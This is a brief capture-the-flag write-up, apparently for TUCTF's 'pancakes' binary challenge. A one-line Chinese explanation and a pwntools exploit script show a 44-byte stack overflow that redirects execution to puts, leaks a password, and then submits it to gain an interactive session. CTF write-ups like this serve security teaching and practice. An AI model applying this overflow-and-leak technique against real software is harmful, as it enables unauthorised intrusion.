### pancakes

> [附件](./pancakes)

44字节溢出覆盖返回地址调用puts函数输出passwd

[Exploit script:](./pc.py)

```python
from pwn import *
context.log_level='debug'

p = process('./pancakes')
p = remote('chal.tuctf.com',30503)
elf = ELF('./pancakes')
#gdb.attach(p)
p.recvuntil('> ')
p.sendline('A'*44+p32(elf.symbols['puts'])+p32(0x0804901e)+p32(0x804c060)+p32(elf.symbols['main']))
p.recvuntil('Try harder\n')
passwd = p.recvuntil('\n',drop=True)
log.success("pw:%s"%passwd)
p.recvuntil('> ')
p.send(passwd)

p.interactive()
```

